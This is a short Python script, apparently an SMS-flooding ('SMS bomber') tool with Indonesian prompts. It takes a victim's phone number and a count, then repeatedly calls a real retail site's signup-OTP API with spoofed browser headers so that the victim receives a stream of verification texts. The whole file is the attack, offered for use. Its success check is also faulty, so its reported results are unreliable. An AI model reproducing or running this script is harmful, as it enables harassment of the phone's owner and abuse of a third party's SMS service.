import json,requests,os,time

def main():
        os.system('clear')
        os.system('figlet sms')
        banner = '''
        author : harlan
        fb     : harlan jhy
        ===================
        '''
        
        print(banner)
        no = input('masukan no target : ')
        jum = input('jumlah sms : ')
        
        head = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }
        
        
        dat = {
        'phone': no
        }
        
        
        for x in range(int(jum)):
                leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
        if 'error' in leosureo:
                print('gagal mengirim pesan')
        else:
                print(' berhasil mengirim ke no '+ no)

main()